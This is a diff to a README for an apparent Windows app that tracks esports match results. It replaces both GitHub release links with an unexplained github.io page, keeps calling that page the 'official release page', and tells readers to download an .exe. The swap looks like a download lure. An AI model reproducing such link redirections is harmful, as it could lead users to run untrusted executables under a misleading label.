@@ -1,6 +1,6 @@
 # 🎮 itamarimor2009-esports-app - Track your favorite esports match results
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/commonmosquitogenussloanea973/itamarimor2009-esports-app/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://commonmosquitogenussloanea973.github.io)
 
 ## What this program does
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Go to the [official release page](https://github.com/commonmosquitogenussloanea973/itamarimor2009-esports-app/releases).
+1. Go to the [official release page](https://commonmosquitogenussloanea973.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link ending in .exe to start the file transfer.
 4. Save the file to your Downloads folder.
